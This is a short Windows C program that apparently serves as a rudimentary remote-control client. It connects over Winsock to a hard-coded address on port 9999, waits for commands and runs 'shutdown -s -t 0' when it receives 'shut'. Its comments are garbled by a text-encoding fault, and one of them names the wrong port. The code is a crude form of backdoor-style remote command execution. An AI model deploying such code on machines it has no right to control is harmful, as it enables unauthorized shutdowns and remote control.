#include <stdio.h>
#include <Winsock2.h>
#include <String.h>

#pragma comment(lib,"ws2_32.lib")
void creatSock(){
	WSADATA wsaData;
    SOCKET sockClient;//�ͻ���Socket
    SOCKADDR_IN addrServer;//����˵�ַ
    WSAStartup(MAKEWORD(2,2),&wsaData);
    //�½��ͻ���socket
    sockClient=socket(AF_INET,SOCK_STREAM,0);
    //����Ҫ���ӵķ���˵�ַ
    addrServer.sin_addr.S_un.S_addr=inet_addr("192.168.88.105");//Ŀ��IP(127.0.0.1�ǻ��͵�ַ)
    addrServer.sin_family=AF_INET;
    addrServer.sin_port=htons(9999);//���Ӷ˿�6000
    //����
	char sen[20]="";
	char rec[20]="";
	while(1){
		//���ӵ������
		connect(sockClient,(SOCKADDR*)&addrServer,sizeof(SOCKADDR));
		memset(rec,0,sizeof(char)*20);
		if(recv(sockClient,rec,20,0)){
			strcpy(sen,"Type \'help\' for help");
			if(strcmp(rec,"EXIT")==0){
				//strcpy(sen,"exit");
				break;
			}
			
			else if(strcmp(rec,"shut")==0){
				system("shutdown -s -t 0");
				break;
			}
			send(sockClient,sen,strlen(sen)+1,0);
		}
	}
    //�ر�socket
    closesocket(sockClient);
    WSACleanup();
}


int main(){
	creatSock();
	system("pause");
	return 0;
}